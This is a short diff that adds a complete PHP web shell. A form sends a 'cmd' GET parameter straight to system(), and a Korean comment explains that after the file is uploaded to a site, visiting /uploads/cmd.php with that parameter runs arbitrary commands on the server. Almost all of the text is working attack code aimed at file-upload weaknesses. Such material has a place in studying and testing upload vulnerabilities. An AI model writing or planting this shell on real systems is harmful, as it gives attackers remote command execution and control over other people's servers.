@@ -1,0 +1,13 @@
+<html><body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form><pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']); // GET 파라미터로 전달된 명령을 실행합니다.
+    }
+?></pre></body></html>
+
+/* 업로드가 성공하면,웹 브라우저에서 http://example.com/uploads/cmd.php와 같이 업로드된 파일에 접근 후 cmd 파라미터를 추가하여 원하는 명령어를 실행 */
